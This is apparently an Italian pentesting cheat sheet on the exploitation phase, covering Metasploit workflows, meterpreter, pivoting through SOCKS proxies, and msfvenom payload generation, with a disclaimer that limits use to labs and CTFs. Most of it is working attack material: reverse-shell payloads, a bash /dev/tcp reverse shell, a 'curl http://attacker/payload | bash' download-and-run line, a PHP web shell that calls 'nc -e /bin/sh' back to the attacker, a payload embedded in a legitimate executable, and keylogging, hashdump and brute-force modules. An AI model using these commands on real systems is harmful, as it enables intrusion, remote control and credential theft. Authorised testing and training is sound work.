# 💥 Exploitation

Appunti e snippet per la fase di **sfruttamento** delle vulnerabilità.

## 📌 Obiettivi

* Ottenere **RCE**/shell sul target.
* Stabilire una **sessione stabile** (shell o Meterpreter).
* Preparare **pivoting** e **post-exploitation**.

> ⚠️ Uso consentito **solo** in lab/CTF e ambienti con autorizzazione.

---

## 🧰 Metasploit Framework (MSF)

Metasploit è una piattaforma modulare per **ricerca**, **sfruttamento**, **post-exploitation** e **pivoting**.

### 🧱 Architettura (in breve)

* **msfconsole** → CLI principale.
* **Moduli**:

  * `exploit/` (sfruttano vulnerabilità)
  * `auxiliary/` (scanner, brute-force, server, socks, ecc.)
  * `payload/` (reverse/bind, meterpreter, stageless/staged)
  * `post/` (raccolta info, escalation, pivot)
  * `encoder/` e `nop/` (rari in lab moderni)
* **DB integrato** (hosts, services, vulns, notes, loot).
* **Resource scripts** (`.rc`) per automazione.

---

### 🚀 Avvio & Database

```bash
msfdb init          # (una tantum) inizializza DB
msfconsole -q       # avvia MSF in quiet mode
```

Dentro msfconsole:

```text
db_status           # verifica connessione al DB
workspace -a lab1   # crea e passa al workspace "lab1"
setg LHOST 10.10.14.23       # variabili globali (es. IP attaccante)
setg ReverseListenerBindAddress 0.0.0.0
```

Importa risultati Nmap (utile!):

```text
db_import ./scans/nmap_full.xml
hosts; services; vulns
```

---

### 🔎 Ricerca moduli

```text
search type:exploit name:cve-2017 platform:windows
search app:tomcat type:exploit
search cve:2011-2523
```

Per un modulo:

```text
use exploit/multi/http/tomcat_mgr_upload
info                   # dettagli, riferimenti, targets
show options           # parametri richiesti
show payloads          # payload compatibili
show targets           # selezione target specifici
```

---

### 🧪 Workflow standard (checklist)

1. **Identifica** servizio/versione (da Recon).
2. **search** modulo e leggilo con `info`.
3. `use` il modulo + **set** opzioni chiave:

   * `RHOSTS`, `RPORT`, `SSL`, `TARGET`, `VHOST` (virtual host), `HttpClientTimeout`, ecc.
4. `check` se supportato (verifica non invasiva).
5. `set PAYLOAD` (es. `windows/x64/meterpreter/reverse_tcp`).
6. `set LHOST`/`LPORT` (o già globali).
7. `exploit -j -z` → in background, non attacca la console.
8. `sessions -l` / `sessions -i <id>` per interagire.

Esempio completo:

```text
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.10
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cr3t
set TARGET Java Universal
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.14.23
set LPORT 4444
check
exploit -j -z
sessions -l
sessions -i 1
```

---

## 🧨 Payload: scelte e concetti

### Staged vs. Stageless

* **Staged** (`/meterpreter/reverse_tcp`): piccolo stadio iniziale → scarica il resto. Pro: leggero; Contro: più fragile a IDS.
* **Stageless** (`/meterpreter_reverse_tcp`): monolitico. Pro: meno richieste; Contro: più grande.

### Trasporti comuni

* `reverse_tcp` → semplice, diretto.
* `reverse_http`/`https` → attraversa proxy/firewall, mimetico.
* `bind_tcp` → raramente utile in CTF moderni (NAT).

### Piattaforma/arch

* `windows/x64/*`, `linux/x64/*`, `python/*`, `java/*`, `php/*`, `cmd/unix/*`, `nodejs/*`, ecc.

---

## 🧪 Meterpreter 101 (uso essenziale)

Dentro la sessione:

```text
help; sysinfo; getuid
ps; migrate <pid>          # stabilizza su processo affidabile
shell                      # shell di sistema
download /path/file .
upload local.bin /tmp/
background                 # Ctrl+Z e poi "bg"
```

Moduli post utili:

```text
run post/multi/manage/autoroute  # aggiunge rotte per la subnet del target
portfwd add -l 8080 -p 80 -r 10.10.10.10  # port forwarding
screenshare; screenshot; keyscan_start/stop
hashdump                      # se permessi
```

> Tip: per stabilità immediata:
> `set AutoRunScript post/windows/manage/migrate` (o `migrate -f` manuale).

---

## 🌉 Pivoting con MSF (autoroute + SOCKS)

### Scenario

Hai una sessione meterpreter su **Host A (10.10.10.10)** che vede **Subnet B (10.10.11.0/24)**.

**Passi:**

1. Aggiungi route automaticamente:

```text
sessions -i 1
run post/multi/manage/autoroute
# oppure manuale:
run post/multi/manage/autoroute CMD=add SUBNET=10.10.11.0 NETMASK=255.255.255.0
background
```

2. Avvia un **SOCKS proxy** in Metasploit:

```text
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j
```

3. Imposta uso proxy per moduli MSF:

```text
setg Proxies socks4:127.0.0.1:1080
```

4. Usa tool esterni con `proxychains`:

```bash
proxychains nmap -sT -Pn 10.10.11.15
proxychains crackmapexec smb 10.10.11.0/24
```

---

## 🎛️ Handler universale (manual delivery)

Quando **consegni il payload tu** (upload via web shell, RCE, file share ecc.), usa l’**handler**:

```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.23
set LPORT 4444
set ExitOnSession false     # accetta più connessioni
exploit -j
```

> Usalo anche insieme a **msfvenom** (vedi sotto) per ricevere la callback.

---

## 🧪 msfvenom (generazione payload)

### Elenca payload

```bash
msfvenom -l payloads | grep meterpreter
```

### Genera binari/eseguibili

```bash
# Windows EXE (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe -o payload.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f elf -o payload.elf

# Web (PHP)
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f raw -o shell.php

# Java WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war -o shell.war
```

### Raw one-liner (Bash)

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.23 LPORT=4444 -f raw
```

### Opzioni utili

```bash
# Evita caratteri bad
msfvenom -p ... -b "\x00\x0a\x0d" -f c

# Usa template (app embedding)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... \
  -x template.exe -k -f exe -o emb_payload.exe
```

> Ricorda: collega sempre l’**handler** giusto in ascolto.

---

## 📜 Automazione con Resource Scripts (.rc)

Crea `tomcat.rc`:

```text
workspace -a lab-tomcat
setg LHOST 10.10.14.23
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.10
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cr3t
set PAYLOAD java/meterpreter/reverse_tcp
set LPORT 4444
exploit -j -z
```

Esegui:

```bash
msfconsole -r tomcat.rc
```

---

## 🧪 Moduli Auxiliary utili in fase di exploit

```text
use auxiliary/scanner/ssh/ssh_login              # brute/creds SSH
use auxiliary/scanner/http/http_login            # brute HTTP basic/digest
use auxiliary/scanner/smb/smb_login              # brute SMB
use auxiliary/admin/http/tomcat_administration   # gestisce credenziali/manager
use auxiliary/server/capture/*                   # listener “fake” per catturare credenziali
```

---

## 🧩 Esempi pratici (end-to-end)

### 1) vsftpd 2.3.4 backdoor (classico HTB/THM)

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.10
set RPORT 21
run
# Se vulnerabile: ottieni shell / sessione
```

### 2) Web RCE → Handler MSF

* Hai un RCE (es. `curl http://attacker/payload | bash`).
* Avvia handler:

  ```text
  use exploit/multi/handler
  set PAYLOAD linux/x64/meterpreter_reverse_tcp
  set LHOST 10.10.14.23
  set LPORT 4444
  exploit -j
  ```
* Consegna payload dal RCE:

  ```bash
  bash -c 'exec 5<>/dev/tcp/10.10.14.23/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
  ```

  *(oppure carica ed esegui `payload.elf` generato con msfvenom).*

### 3) Authenticated exploit (psexec)

```text
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.20
set SMBUser Administrator
set SMBPass 'Passw0rd!'
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.23
run
```

---

## 🧯 Troubleshooting & Tips

* **Nessuna callback?**

  * Verifica `LHOST` (IP corretto / interfaccia VPN HTB/THM).
  * Cambia trasporto: `reverse_http` / `reverse_https`.
  * Su NAT: `ReverseListenerBindAddress 0.0.0.0` e `LHOST` pubblico/VPN.
  * Firewall host attaccante: apri la porta `LPORT`.
* **Modulo fallisce a metà?**

  * `set VERBOSE true`, aumenta `WfsDelay` (WebApp lente).
  * Prova **stageless** (`*_reverse_tcp`) o **arch** coerente (x86 vs x64).
* **Sessione instabile?**

  * Subito `migrate` su processo affidabile.
  * Usa `reverse_https` (più resiliente).
* **Proxy corporate (in lab)?**

  * Preferisci `reverse_http[s]` e imposta `Proxy*` se richiesto.
* **Loop di exploit?**

  * `set ExitOnSession false` + `exploit -j` per catturare più callback.

---

## 🧪 Sfruttamento senza Metasploit (quick refs)

* **searchsploit** per PoC pubblici:

  ```bash
  searchsploit <software> <version>
  searchsploit -m exploits/linux/local/12345.c
  ```
* **Python PoC**:

  ```bash
  python3 exploit.py --target 10.10.10.10 --rhost 10.10.14.23 --rport 4444
  ```
* **Web shell** (se uploadabile):

  ```php
  <?php system($_GET['cmd']); ?>
  # curl "http://target/shell.php?cmd=nc -e /bin/sh 10.10.14.23 4444"
  ```

> Dopo l’accesso, passa a **Post Exploitation** (`9 - Post Exploitation.md`) e agli strumenti di **Privilege Escalation** (`6 - Privilege Escalation.md`).

---

## 📚 Comandi rapidi Metasploit (mini-cheatsheet)

```text
# DB / Workspace
db_status
workspace -a <name>; workspace

# Ricerca / Info
search <query>
use <module>
info; show options; show payloads; show targets

# Exploit
set RHOSTS <ip|range>
set RPORT <port>
set PAYLOAD <payload>
set LHOST <ip>; set LPORT <port>
check
exploit -j -z

# Sessioni
sessions -l
sessions -i <id>
background   # (Ctrl+Z)
setg Proxies socks4:127.0.0.1:1080

# Meterpreter
sysinfo; getuid; ps; migrate <pid>
upload; download; shell; portfwd
run post/multi/manage/autoroute
```

---

## ✅ Checklist finale (prima di lanciare l’exploit)

* [ ] Confermato **servizio/versione** e **porta**.
* [ ] Modulo scelto con `info` e **opzioni** capite.
* [ ] **Payload** coerente (piattaforma/arch/trasporto).
* [ ] **LHOST/LPORT** corretti e **handler** pronto.
* [ ] Impostate opzioni di **stabilità** (migrate/https).
* [ ] Se serve, configurato **pivoting** (autoroute + socks).

---
